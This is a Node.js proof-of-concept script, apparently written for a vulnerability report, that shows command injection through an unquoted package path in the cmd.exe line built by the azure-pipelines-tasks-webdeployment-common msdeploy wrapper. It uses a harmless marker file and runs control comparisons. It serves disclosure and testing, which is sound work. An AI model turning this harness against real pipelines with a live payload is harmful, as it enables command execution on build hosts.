// azure-pipelines-tasks-webdeployment-common: the deployment package path reaches the
// cmd.exe /D /S /C line that the shared package builds for msdeploy, unquoted.
// Runs on a real Windows host. msdeploy.exe is replaced by a native argv printer and the
// injected command is mark.exe, which writes PWNED-<id>.txt. Nothing destructive runs.
const fs = require('fs');
const path = require('path');
const trm = require('azure-pipelines-task-lib/toolrunner');

const WORK = process.argv[2];
const PAYLOAD_ZIP = process.argv[3];
const MARKER_ID = process.env.MSRC_MARKER_ID;

const PKG = path.dirname(require.resolve('azure-pipelines-tasks-webdeployment-common/package.json'));
const msdeployutility = require(path.join(PKG, 'msdeployutility.js'));
console.log('webdeployment-common : ' + require(path.join(PKG, 'package.json')).version);
console.log('task-lib             : ' + require('azure-pipelines-task-lib/package.json').version);
console.log('node                 : ' + process.version + '   platform: ' + process.platform);
console.log('package on disk      : ' + PAYLOAD_ZIP + '  exists=' + fs.existsSync(PAYLOAD_ZIP));

// argStringToArray is module private in the shipped deployusingmsdeploy.js, so the exact
// shipped function text is read out of that file and evaluated unmodified.
const src = fs.readFileSync(path.join(PKG, 'deployusingmsdeploy.js'), 'utf8');
const start = src.indexOf('function argStringToArray');
const fnText = src.slice(start, src.indexOf('\n}', start) + 2);
const argStringToArray = new Function(fnText + '; return argStringToArray;')();
console.log('argStringToArray     : lifted verbatim from the shipped file, ' + fnText.length + ' bytes');

// The shipped option pair, read out of the shipped file rather than asserted.
const optIdx = src.indexOf('windowsVerbatimArguments');
console.log('shipped options      : ' + src.slice(src.lastIndexOf('{', optIdx), src.indexOf('}', optIdx) + 1).replace(/\s+/g, ' '));

function markerPath() { return path.join(WORK, 'PWNED-' + MARKER_ID + '.txt'); }
function clearMarker() { try { fs.unlinkSync(markerPath()); } catch (e) {} }

function leg(label, pkgPath, options) {
    clearMarker();
    const cmdArgs = msdeployutility.getMSDeployCmdArgs(
        pkgPath, 'MySite', null, false, false, false, null, null, null, false, false, true);
    const arr = argStringToArray(cmdArgs);
    const srcTok = arr.find(a => a.indexOf('-source:package=') === 0);

    const tr = new trm.ToolRunner('msdeploy');
    arr.forEach(a => tr.arg(a));
    const opts = Object.assign({ cwd: WORK, env: process.env, silent: true, failOnStdErr: false, ignoreReturnCode: true }, options);

    console.log('\n================ ' + label);
    console.log('  package path             : ' + pkgPath);
    console.log('  msdeployutility builds   : ' + cmdArgs.trim().split(' ')[1]);
    console.log('  after argStringToArray   : ' + JSON.stringify(srcTok));
    console.log('  windowsVerbatimArguments : ' + !!opts.windowsVerbatimArguments + '   shell: ' + !!opts.shell);
    console.log('  spawn args               : ' + JSON.stringify(tr._getSpawnSyncArgs ? tr._getSpawnArgs(opts) : tr._getSpawnArgs(opts)));
    const r = tr.execSync(opts);
    console.log('  exit code                : ' + r.code);
    (r.stdout || '').split(/\r?\n/).filter(s => s.trim()).forEach(s => console.log('  out> ' + s.trim()));
    (r.stderr || '').split(/\r?\n/).filter(s => s.trim()).forEach(s => console.log('  err> ' + s.trim()));
    const fired = fs.existsSync(markerPath());
    console.log('  MARKER FILE WRITTEN      : ' + fired);
    if (fired) console.log('  marker contents          : ' + fs.readFileSync(markerPath(), 'utf8').trim().split(/\r?\n/).join(' | '));
    return fired;
}

const ORDINARY = path.join(WORK, 'app.zip');
fs.writeFileSync(ORDINARY, 'inert');

const SHIPPED = { windowsVerbatimArguments: true, shell: true };
const r1 = leg('INJECT    committed package name, SHIPPED options', PAYLOAD_ZIP, SHIPPED);
const r2 = leg('CONTROL   identical bytes, windowsVerbatimArguments omitted', PAYLOAD_ZIP, { shell: true });
const r3 = leg('CONTROL   ordinary package name, SHIPPED options', ORDINARY, SHIPPED);

console.log('\n================ SUMMARY');
console.log('  INJECT  committed name + shipped options   marker=' + r1);
console.log('  CONTROL same bytes, escaping left on       marker=' + r2);
console.log('  CONTROL ordinary name + shipped options    marker=' + r3);
process.exit(0);
